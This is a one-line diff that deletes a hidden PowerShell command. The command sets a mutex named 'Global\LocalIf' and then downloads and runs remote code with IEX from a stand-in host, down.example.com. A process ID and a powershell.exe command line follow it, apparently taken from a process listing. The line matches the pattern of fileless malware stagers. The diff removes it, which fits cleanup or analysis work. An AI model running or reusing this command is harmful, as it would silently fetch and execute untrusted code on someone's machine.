@@ -1,1 +1,0 @@
-powershell  -nop -w hidden -ep bypass -c "try{$localIf=$flase;New-Object System.Threading.Mutex($true,'Global\LocalIf',[ref]$localIf)}catch{};IEX (New-Object Net.WebClient).downloadstring('http://down.example.com/')"   28648"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -s -NoLogo -NoProfile 
